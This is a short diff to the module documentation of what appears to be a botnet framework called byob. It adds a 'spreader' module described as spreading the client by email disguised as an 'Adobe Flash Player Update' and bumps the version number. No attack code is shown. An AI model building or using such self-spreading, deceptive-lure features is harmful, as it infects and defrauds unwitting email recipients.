@@ -112,6 +112,9 @@ byob.modules
   byob.modules.process
     list/search/kill/monitor currently running processes on the host
 
+  byob.modules.spreader
+    spread client to other hosts via email disguised as 'Adobe Flash Player Update'
+
   byob.modules.payloads
     package containing the payloads created by client generator that are being
     hosted locally by the server (rather than uploaded to Pastebin to be hosted
@@ -133,7 +136,7 @@ def main():
         exec("import {}".format(module))
 
 __all__ = __get_all()
-__version__ = '0.3'
+__version__ = '0.4'
 __license__ = 'GPLv3'
 __author__ = 'Daniel Vega-Myhre'
 __github__ = 'https://github.com/malwaredllc/byob'
